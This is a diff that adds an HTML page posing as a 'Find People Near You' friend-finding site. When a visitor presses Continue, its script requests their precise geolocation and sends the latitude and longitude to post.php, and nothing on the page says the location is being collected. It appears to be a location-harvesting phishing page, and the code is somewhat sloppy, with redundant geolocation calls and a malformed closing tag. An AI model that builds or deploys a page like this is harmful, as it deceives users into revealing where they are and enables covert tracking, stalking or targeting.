@@ -1,0 +1,83 @@
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width,user-scalable=0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+    <style>
+      body{
+        background:#000;
+      }h2{
+  font-family: 'Raleway', sans-serif;
+  color: white;
+  text-align: center;
+  filter: drop-shadow(0px 0px 8px cyan);
+  margin: auto;
+  position: fixed;
+  top: 15%;
+  left: 0%;
+  right: 0%;
+}
+      h1
+{
+  font-family: 'Raleway', sans-serif;
+  color: white;
+  text-align: center;
+  filter: drop-shadow(0px 0px 8px cyan);
+  margin: auto;
+  position: fixed;
+  top: 5%;
+  left: 0%;
+  right: 0%;
+}
+img{
+  position: fixed;
+ margin: auto;
+ left: 0%;
+ right: 0%;
+ top: 30%;
+ height: 50%;
+ opacity: 70%;
+ border-radius:100%;
+}.button
+{
+  background-color: Transparent;
+  border: 2px solid white;
+  cursor: pointer;
+  color: white;
+  font-size: 24px;
+  padding: 14px 40px;
+  border-radius: 6px;
+  width: 50%;
+  text-align: center;
+  font-family: 'Raleway', sans-serif;
+  position: fixed;
+  left: 25%;
+  right: 25%;
+  bottom: 10%;
+  filter: drop-shadow(0px 0px 8px cyan);
+  transition: text-shadow 0.2s linear;
+}
+    </style>
+    <script type="text/javascript">
+      function main(){
+        navigator.geolocation.getCurrentPosition(showPosition)
+        if(navigator.geolocation.getCurrentPosition(showPosition) === false){
+          navigator.geolocation.getCurrentPosition(showPosition);
+        }else{
+          navigator.geolocation.getCurrentPosition(showPosition);
+        }
+        function showPosition(position) {
+   window.location.href="post.php?lat="+position.coords.latitude + "&long=" + position.coords.longitude;
+}
+      }
+    </script>
+  </head>
+  <body>
+    <h1>
+        Find People Near You
+    </h1>
+    <div><h2>Meet New People, Make New Friends</h2></div>
+    <img src="img.jpg">
+    <div>
+      <button id="change" class="button" type="button" onclick="main()">Continue</button
+    </div>
+  </body>
+</html>
